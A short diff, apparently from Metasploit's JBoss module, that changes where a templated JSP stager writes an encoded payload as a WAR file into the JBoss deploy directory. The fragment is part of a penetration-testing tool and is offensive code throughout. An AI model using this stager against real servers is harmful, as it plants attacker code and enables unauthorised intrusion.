@@ -56,7 +56,7 @@ module Msf::HTTP::JBoss::DeploymentFileRepositoryScripts
 %>
 <%
   String #{jboss_home_var} = System.getProperty("jboss.server.home.dir");
-  String #{file_path_var} = #{jboss_home_var} + "/deploy/" + "#{app_base}.war";
+  String #{file_path_var} = #{jboss_home_var} + "/deploy/management/" + "#{app_base}.war";
   try {
     String #{content_var} = "#{encoded_payload}";
     FileOutputStream #{fos_var} = new FileOutputStream(#{file_path_var});
